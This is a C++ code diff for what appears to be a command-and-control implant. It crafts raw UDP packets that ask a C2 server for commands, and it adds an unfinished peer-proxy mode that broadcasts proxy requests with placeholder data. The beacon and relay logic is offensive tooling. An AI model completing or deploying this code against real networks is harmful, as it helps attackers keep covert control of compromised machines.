@@ -77,15 +77,20 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
             return 1;
         }
         case 0x05: {
+#if defined(_WIN32) || defined(WIN32)
+            // Windows Proxy not support yet
+            return -1;
+#endif
             // TODO: Handle Proxy stuff
             // Check the proxy type value
             switch (eventInfo->bpProxy.msg_type) {
-                case 0x00: {
+                case PacketParse::proxy_code_t::noop_e: {
                     // noop
                     std::cout << "Proxy NOOP received!" << std::endl;
-                    return -1;
+                    return 1;
                 }
-                case 0x20: {
+                case PacketParse::proxy_code_t::proxy_req_e: {
+                    std::cout << "Proxy REQUEST received!" << std::endl;
                     // Proxy REQUEST message
                     // Handle responding to PROXY REQUEST message here
 
@@ -93,8 +98,11 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
 
                     // If not cutoff from the server:
                     // Respond via unicast to the request with the same session ID and information
+                    return 1;
                 }
-                case 0x30: {
+                case PacketParse::proxy_code_t::proxy_resp_e: {
+                    std::cout << "Proxy RESPONSE received!" << std::endl;
+                    std::cout << "[!] Initiating session..." << std::endl;
                     // Proxy RESPONSE message
                     // Handle final setup of proxy session
 
@@ -103,12 +111,17 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
                     // Check to see if we are currently proxied
                     // If not currently proxied:
                     // Initiate the proxy session by responding to our Proxy with the information to proxy
+                    return 1;
                 }
-                case 0x40: {
+                case PacketParse::proxy_code_t::serv_info_e: {
+                    std::cout << "Proxy SERVER MSG received!" << std::endl;
                     // Packet is intended for the server or is already part of an established proxy session
                     // Not much to do here
+                    return 1;
                 }
-                case 0x50: {
+                case PacketParse::proxy_code_t::proxy_end_e: {
+                    std::cout << "Proxy END MSG received!" << std::endl;
+                    std::cout << "[!] Ending proxy session..." << std::endl;
                     // PROXY END message
 
                     // If we are currently proxied:
@@ -116,6 +129,7 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
 
                     // Otherwise:
                     // Do nothing
+                    return 1;
                 }
                 default: {
                     // Improper proxy message ID
@@ -133,32 +147,66 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
 
 void BPHelper::requestAction() {
     std::lock_guard<std::mutex> g(socketMutex);
-    PacketParse::bp_header_t bpHeader{};
-    PacketParse::bp_command_request_t bp_command_request_header{};
-    bpHeader.header_type = 0x01;
-    bp_command_request_header.target_OS = 0x01;
-    bp_command_request_header.command_num = htonl(currentCmd);
-    bp_command_request_header.host_ip = rawSocket.getIP();
+    // ! Testing Proxy Switch
+    this->proxyTesting = true;
+    if (!this->proxyTesting) {
+        PacketParse::bp_header_t bpHeader{};
+        PacketParse::bp_command_request_t bp_command_request_header{};
+        bpHeader.header_type = 0x01;
+        bp_command_request_header.target_OS = 0x01;
+        bp_command_request_header.command_num = htonl(currentCmd);
+        bp_command_request_header.host_ip = rawSocket.getIP();
 
-    auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
-    auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_command_request_header);
+        auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
+        auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_command_request_header);
 
-    std::vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
-    payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));
+        std::vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
+        payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));
 
 #if defined(_WIN32) || defined(WIN32)
-    std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload);
-    rawSocket.send(req);
+        std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload);
+        rawSocket.send(req);
 #else
-    std::vector<uint8_t> req =
-        CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload, rawSocket.getMac(), nextHopMac);
-    rawSocket.send(req);
+        std::vector<uint8_t> req =
+            CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload, rawSocket.getMac(), nextHopMac);
+        rawSocket.send(req);
 #endif
+    } else {
+        // ! Testing Proxy mode only!
+        // * Sending out proxy requests
+        PacketParse::bp_header_t bpHeader{};
+        PacketParse::bp_proxy_t proxyHeader{};
+        bpHeader.header_type = 0x05;
+        proxyHeader.msg_type = PacketParse::proxy_code_t::proxy_req_e;  // Sending proxy request
+
+        // Session ID
+        std::srand(static_cast<unsigned int>(time(nullptr)));
+        proxyHeader.session_id = static_cast<uint32_t>(std::rand());
+
+        // Place holder data for now
+        std::string placeholder{"Placeholder for data to proxy"};
+
+        auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
+        auto proxy_ptr = reinterpret_cast<unsigned char *>(&proxyHeader);
+
+        // Packet payload;
+        // payload.emplace_back(bpHeader, proxyHeader, placeholder);
+        std::vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
+        payload.insert(payload.end(), proxy_ptr, proxy_ptr + sizeof(proxyHeader));
+        // payload.emplace_back(placeholder);
+        std::copy(placeholder.begin(), placeholder.end(), std::back_inserter(payload));
+
+        uint8_t broadcast[4] = {255, 255, 255, 255};
+        uint32_t broad = *reinterpret_cast<uint32_t *>(broadcast);
+        std::vector<uint8_t> req =
+            CraftUDPPacket(rawSocket.getIP(), broad, srcPort, dstPort, payload, rawSocket.getMac(), nextHopMac);
+        rawSocket.send(req);
+    }
 }
 
 BPHelper::BPHelper() {
 #ifdef __unix__
-    rawSocket = RawSocket(c2Ip);
+    rawSocket = RawSocket(c2Ip, false);
     if (useGateway) {
         nextHopMac = rawSocket.getMacOfIP(ntohl(gatewayIp));
     } else {
